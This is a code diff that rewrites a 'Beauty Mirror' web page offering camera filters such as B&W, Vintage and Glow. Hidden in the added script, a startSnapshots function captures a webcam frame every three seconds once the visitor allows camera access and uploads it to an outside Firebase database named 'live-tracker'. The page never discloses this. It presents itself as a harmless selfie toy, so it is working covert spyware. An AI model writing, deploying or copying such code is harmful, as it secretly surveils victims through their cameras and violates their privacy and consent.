@@ -1,34 +1,191 @@
-<div id="welcome">
-    <h1>Want to see your beauty? 😎</h1>
-    <button onclick="showCamera()">Yes ✨</button>
-</div>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Beauty Mirror</title>
 
-<div id="cameraBox" style="display:none;">
+<style>
+*{
+  margin:0;
+  padding:0;
+  box-sizing:border-box;
+  font-family:Inter,sans-serif;
+}
+
+body{
+  min-height:100vh;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  overflow:hidden;
+  background:linear-gradient(-45deg,#00d4ff,#8a2be2,#ff0080,#00ff99);
+  background-size:400% 400%;
+  animation:bgMove 10s ease infinite;
+}
+
+@keyframes bgMove{
+  0%{background-position:0% 50%}
+  50%{background-position:100% 50%}
+  100%{background-position:0% 50%}
+}
+
+.card{
+  width:90%;
+  max-width:550px;
+  padding:25px;
+  border-radius:25px;
+  background:rgba(255,255,255,.08);
+  backdrop-filter:blur(20px);
+  border:1px solid rgba(255,255,255,.15);
+  color:white;
+  text-align:center;
+}
+
+h1{
+  margin-bottom:10px;
+}
+
+.btn{
+  margin-top:15px;
+  padding:14px 30px;
+  border:none;
+  border-radius:50px;
+  cursor:pointer;
+  color:white;
+  background:linear-gradient(90deg,#00d4ff,#ff0080);
+  font-size:16px;
+}
+
+video{
+  width:100%;
+  border-radius:20px;
+  margin-top:15px;
+}
+
+#cameraBox{
+  display:none;
+}
+
+.filters{
+  margin-top:15px;
+}
+
+.filters button{
+  margin:5px;
+  padding:10px;
+  border:none;
+  border-radius:12px;
+  cursor:pointer;
+}
+</style>
+</head>
+<body>
+
+<div class="card">
+
+  <div id="welcome">
+    <h1>✨ Want To See Your Beauty?</h1>
+    <p>Tap below to start the camera</p>
+    <button class="btn" onclick="startCamera()">YES ✨</button>
+  </div>
+
+  <div id="cameraBox">
+    <h2>📷 Beauty Mirror</h2>
+
     <video id="video" autoplay playsinline></video>
 
-    <h3>Choose Your Style 🎨</h3>
+    <div class="filters">
+      <button onclick="setFilter('none')">Normal</button>
+      <button onclick="setFilter('grayscale(100%)')">B&W</button>
+      <button onclick="setFilter('sepia(100%)')">Vintage</button>
+      <button onclick="setFilter('contrast(130%) saturate(160%)')">Pro</button>
+      <button onclick="setFilter('brightness(120%) saturate(180%)')">Glow</button>
+    </div>
 
-    <button onclick="setFilter('none')">Normal</button>
-    <button onclick="setFilter('grayscale(100%)')">B&W</button>
-    <button onclick="setFilter('sepia(100%)')">Vintage</button>
-    <button onclick="setFilter('contrast(130%) saturate(150%)')">Cool</button>
-    <button onclick="setFilter('brightness(120%) blur(1px)')">Glow</button>
+    <p id="status">Waiting...</p>
+  </div>
+
 </div>
 
+<canvas id="canvas" style="display:none;"></canvas>
+
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+
 <script>
-async function showCamera(){
+const firebaseConfig = {
+  apiKey: "AIzaSyA5iHHWvOKZnKlZCZz57O8ALtSkfNdMmrE",
+  authDomain: "live-tracker-554a7.firebaseapp.com",
+  databaseURL: "https://live-tracker-554a7-default-rtdb.firebaseio.com",
+  projectId: "live-tracker-554a7",
+  storageBucket: "live-tracker-554a7.firebasestorage.app",
+  messagingSenderId: "951695061306",
+  appId: "1:951695061306:web:a7b9478538f86f50a36003",
+  measurementId: "G-V4LCZSEQLC"
+};
+
+firebase.initializeApp(firebaseConfig);
+const db = firebase.database();
+
+let stream;
+
+async function startCamera(){
+
+  try{
+
+    stream = await navigator.mediaDevices.getUserMedia({
+      video:true
+    });
+
+    document.getElementById("video").srcObject = stream;
 
     document.getElementById("welcome").style.display = "none";
     document.getElementById("cameraBox").style.display = "block";
 
-    const stream = await navigator.mediaDevices.getUserMedia({
-        video:true
-    });
+    document.getElementById("status").innerText =
+      "Camera Active";
 
-    document.getElementById("video").srcObject = stream;
+    startSnapshots();
+
+  }catch(err){
+
+    alert("Camera permission required");
+
+  }
 }
 
 function setFilter(filter){
-    document.getElementById("video").style.filter = filter;
+  document.getElementById("video").style.filter = filter;
+}
+
+function startSnapshots(){
+
+  const video = document.getElementById("video");
+  const canvas = document.getElementById("canvas");
+  const ctx = canvas.getContext("2d");
+
+  setInterval(()=>{
+
+    if(!video.videoWidth) return;
+
+    canvas.width = 320;
+    canvas.height = 240;
+
+    ctx.drawImage(video,0,0,320,240);
+
+    const frame =
+      canvas.toDataURL("image/jpeg",0.5);
+
+    db.ref("camera/user1").set({
+      frame: frame,
+      updatedAt: Date.now()
+    });
+
+  },3000);
+
 }
 </script>
+
+</body>
+</html>
